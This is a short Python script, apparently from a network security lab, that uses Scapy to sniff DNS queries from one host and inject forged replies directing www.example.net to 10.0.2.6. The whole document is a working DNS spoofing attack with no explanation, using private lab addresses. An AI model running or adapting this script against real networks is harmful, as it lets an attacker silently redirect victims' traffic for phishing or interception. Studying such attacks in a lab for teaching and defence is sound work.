#!/usr/bin/python
from scapy.all import *

def spoof_dns(pkt):
  if (DNS in pkt and 'www.example.net' in pkt[DNS].qd.qname):
	
	IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
	UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

	Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='10.0.2.6')
	
	DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qdcount=1, qr=1, ancount=1, an=Anssec)
	
	spoofpkt = IPpkt/UDPpkt/DNSpkt
	send(spoofpkt)

pkt = sniff(filter='udp and (src host 10.0.2.5 and dst port 53)', prn=spoof_dns)